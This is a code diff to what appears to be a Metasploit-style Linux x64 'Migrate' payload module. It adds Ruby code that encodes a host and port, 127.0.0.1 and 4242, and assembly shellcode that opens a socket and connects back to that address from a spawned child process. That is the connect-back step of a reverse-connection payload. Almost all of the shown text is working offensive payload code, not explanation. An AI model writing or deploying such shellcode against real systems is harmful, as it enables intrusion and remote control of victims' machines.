@@ -33,7 +33,8 @@ module Payload::Linux::X64::Migrate
   def generate(opts={})
     
     entry_offset = elf_ep(opts[:payload])
-    
+    encoded_host =  "%.8x" % Rex::Socket.addr_aton("127.0.0.1").unpack("V").first
+    encoded_port = "%.8x" % ["4242".to_i,2].pack("vn").unpack("N").first
     asm = %^
       push rax
       push rcx
@@ -91,6 +92,30 @@ _exec_parent:
       pop rax
       int 3
 _exec_child:
+
+      push r9
+      push   1        ; retry counter
+      pop    r9
+      push   0x29
+      pop    rax
+      cdq
+      push   0x2
+      pop    rdi
+      push   0x1
+      pop    rsi
+      syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
+      pop r9
+      xchg   rdi, rax
+
+    connect:
+      mov    rcx, 0x#{encoded_host}#{encoded_port}
+      push   rcx
+      mov    rsi, rsp
+      push   0x10
+      pop    rdx
+      push   0x2a
+      pop    rax
+      syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
       mov rax, 0x70
       syscall
       xchg rsi, r9
